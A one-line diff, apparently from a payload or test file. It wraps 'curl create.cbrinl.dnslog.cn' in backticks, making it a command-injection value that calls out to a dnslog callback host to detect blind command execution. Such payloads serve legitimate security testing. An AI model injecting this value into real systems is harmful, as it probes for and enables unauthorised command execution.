@@ -1,1 +1,1 @@
-curl create.cbrinl.dnslog.cn
+`curl create.cbrinl.dnslog.cn`
